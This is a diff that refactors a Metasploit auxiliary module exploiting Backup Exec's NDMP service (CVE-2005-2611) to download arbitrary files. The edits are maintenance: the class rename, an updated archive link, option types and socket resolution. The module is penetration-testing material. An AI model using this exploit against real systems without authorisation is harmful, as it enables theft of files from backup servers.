@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::NDMP
 
   def initialize(info = {})
@@ -29,11 +24,11 @@ class Metasploit3 < Msf::Auxiliary
           ['CVE', '2005-2611'],
           ['OSVDB', '18695'],
           ['BID', '14551'],
-          ['URL', 'http://www.fpns.net/willy/msbksrc.lzh'],
+          ['URL', 'https://web.archive.org/web/20120227144337/http://www.fpns.net/willy/msbksrc.lzh'],
         ],
       'Actions'     =>
         [
-          ['Download']
+          ['Download', 'Description' => 'Download arbitrary file']
         ],
       'DefaultAction' => 'Download'
       ))
@@ -41,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(10000),
-        OptAddress.new('LHOST',
+        OptAddressLocal.new('LHOST',
           [
             false,
             "The local IP address to accept the data connection"
@@ -67,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
             "backupexec_dump.mtf"
           ]
         ),
-      ], self.class)
+      ])
   end
 
   def run
@@ -134,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
       0,
       0,
       1,
-      Rex::Socket.gethostbyname(local_addr)[3],
+      Rex::Socket.resolv_nbo(local_addr, false),
       local_port
     ].pack('NNNNNNNA4N')
 
@@ -273,5 +268,4 @@ class Metasploit3 < Msf::Auxiliary
     disconnect
 
   end
-
 end
